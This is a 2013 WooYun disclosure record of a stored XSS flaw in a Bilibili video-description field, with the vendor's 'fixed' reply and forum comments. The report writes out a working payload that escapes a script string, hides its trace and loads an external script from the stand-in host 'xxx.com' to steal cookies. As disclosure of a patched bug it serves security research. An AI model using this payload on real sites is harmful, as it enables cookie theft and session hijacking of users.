{"id": 10794, "wybug_id": "wooyun-2013-026894", "wybug_title": "哔哩哔哩弹幕网xss漏洞一枚，XSS分析与利用技巧", "wybug_corp": "上海幻电信息科技有限公司", "wybug_author": "Kuuki", "wybug_date": "2013-06-26 10:27", "wybug_open_date": "2013-08-10 10:27", "wybug_type": "CSRF", "wybug_level": "低", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["储存型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-06-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-06-26：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-07-06：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-07-16：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-07-26：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-08-10：\t细节向公众公开  简要描述： 可劫持cookie 可csrf 详细说明：  在视频播放页面 查看源码 往下翻 有这么一段\n\n用户输入的内容包含在了脚本里分别是标题简介之类的。。。由于简介内容允许输入的字符最多于是我们在发布视频的简介里面构造代码\n'};\n先闭合掉前面的var p然后清除简介里面的内容 防止别人起疑心\n(s=$('.intro')[0]).innerText=s.innerText.substr(0,s.innerText.indexOf('\\''));\n最后添加恶意的js并且闭合后面（简介中的尖括号会被转换 稍微绕过一下）\n$('.intro').append((a=String.fromCharCode)(60)+'script src=\\'这里插入js地址\\''+a(62));var p={a:'\n   漏洞证明：  POC:\n'};(s=$('.intro')[0]).innerText=s.innerText.substr(0,s.innerText.indexOf('\\''));$('.intro').append((a=String.fromCharCode)(60)+'script'+a(62)+'alert(1)'+a(60)+'/script'+a(62));var p={a:'\n\n\n\n\nEXP:\n'};(s=$('.intro')[0]).innerText=s.innerText.substr(0,s.innerText.indexOf('\\''));$('.intro').append((a=String.fromCharCode)(60)+'script src=\\'http://xxx.com/1.js\\''+a(62));var p={a:'\n尽量用短链  因为简介有长度限制   修复方案：  过滤呗 :)熊姐多给我点rank好不好呀   版权声明：转载请注明来源 Kuuki@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2013-06-26 11:06 厂商回复： 已修复~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-06-26 10:28 |    \t\t斯文的鸡蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 我在这头，你在那头~)\t\t \n  我大B站壮哉    \n     2013-06-26 11:09 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  mark,相应速度好快,A站党报道     \n     2013-06-26 11:10 |    \t\t斯文的鸡蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 我在这头，你在那头~)\t\t \n  @基佬库克 A站ID是多少？我的：黑白配    \n     2013-06-26 12:05 |    \t\tf0r \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:12        | 寻声暗问弹者谁？那人却在灯火阑珊处)\t\t \n  好快    \n     2013-06-26 13:40 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  @斯文的鸡蛋 id:一直撸到    \n     2013-06-26 13:44 |    \t\t斯文的鸡蛋 \t\t\t( 普通白帽子  |\t\t\t        Rank:173 漏洞数:41        | 我在这头，你在那头~)\t\t \n  @基佬库克 果然适合A站的口味    \n     2013-06-26 13:52 |    \t\t基佬库克 \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:15        | 简介什么的是直接爆菊吧..)\t\t \n  @斯文的鸡蛋 这uid...    \n     2013-08-12 10:00 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  熊姐？    \n     2013-09-09 01:38 |    \t\t银冥币 \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:21        | \"/upload/avatar/avatar_251_b.jpg\" />)\t\t \n  B站银冥币报道  表示绕过叼炸天    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}